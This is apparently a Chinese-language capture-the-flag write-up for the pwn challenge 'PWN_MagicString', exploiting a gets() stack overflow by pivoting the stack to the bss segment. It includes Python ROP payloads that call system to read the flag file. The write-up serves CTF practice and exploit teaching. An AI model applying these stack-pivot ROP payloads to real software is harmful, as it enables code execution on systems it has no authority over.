
## PWN_MagicString (434pt)
- 题目描述：
    
    > none
- 题目附件：[PWN_MagicString](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/CTFShow-36D/pwn/PWN_MagicString/PWN_MagicString)
- 考察点：栈迁移
- 难度：中等

### 程序分析

这题和签到那题差不多，就是没直接给`sh`这个字符串，给了`system`，因此也不需要泄漏libc，想办法弄出个`/bin/sh`就行，`main`函数如下，还是简单的栈溢出。

```c
int __cdecl main(int argc, const char **argv, const char **envp){
  char v4; // [rsp+0h] [rbp-2A0h]

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  system("echo Throw away ida pro!!! I want a girlfriend!");
  gets(&v4, 0LL);
  return 0;
}
```

### 解题思路
#### 栈迁移

栈溢出可以覆盖`rbp`，然后用下面这段代码可以完成栈迁移，迁到`bss`段，同时再调用一次`gets`，把`"/bin/sh"`也读到`bss`段。

```nasm
.text:00000000004006C1    call    _gets
.text:00000000004006C6    mov     eax, 0
.text:00000000004006CB    leave
.text:00000000004006CC    retn
```

栈迁移后，通过`gets`在`bss`段布置`rop`链和字符串，就可以在`bss`段完成`rop`攻击拿到shell了。

全部流程如下：

```python
# rop1
offset = 680-8
payload = 'A'*offset
payload += p64(elf.bss()+0x800)
payload += p64(prdi) + p64(elf.bss()+0x800) + p64(0x4006c1) 
ru('Throw away ida pro!!! I want a girlfriend!\n')
sl(payload)
```

> 栈迁移，通过`pop rdi;ret`这个gadget设置`gets`的参数。

```python
# rop2
pl2 = 'AAAAAAAA'+ p64(prdi+1) + p64(prdi) + p64(elf.bss()+0x828) + p64(elf.sym['system']) + 'base64<flag\0\0\0\0\0'
sl(pl2)
```

> 这里因为不知道是不是和签到一样，有过滤了，就执行的base<flag

> `system`用的栈空间比较大，所以选用`bss+0x800`

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/CTFShow-36D/pwn/PWN_MagicString) 

